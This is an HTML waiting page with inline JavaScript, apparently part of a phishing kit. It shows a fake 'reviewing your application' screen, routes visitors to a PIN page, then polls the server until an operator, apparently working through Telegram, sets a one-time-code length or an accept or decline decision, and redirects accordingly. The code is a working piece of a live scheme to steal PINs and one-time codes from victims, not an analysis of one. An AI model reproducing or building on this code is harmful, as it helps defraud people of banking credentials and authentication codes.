<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>
// ===============================
// FIRST → GO TO PIN PAGE
// ===============================
if (localStorage.getItem("firstProcess") === "yes") {
    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 5000);
}

// ===============================
// SECOND → WAIT FOR TELEGRAM
// ===============================
if (localStorage.getItem("fromPin") === "yes") {

    setInterval(() => {

        // 🔹 CHECK OTP
        fetch("/otp-status")
        .then(res => res.json())
        .then(data => {
            if (data.otp === 5 || data.otp === 6) {
                localStorage.setItem("otpLength", data.otp);
                localStorage.removeItem("fromPin");
                window.location.href = "step6.html";
            }
        });

        // 🔹 CHECK DECISION
        fetch("/decision-status")
        .then(res => res.json())
        .then(data => {
            if (data.decision === "accept") {
                window.location.href = "success.html";
            }

            if (data.decision === "decline") {
                window.location.href = "declined.html";
            }
        });

    }, 2000);
}
</script>

</body>
</html>
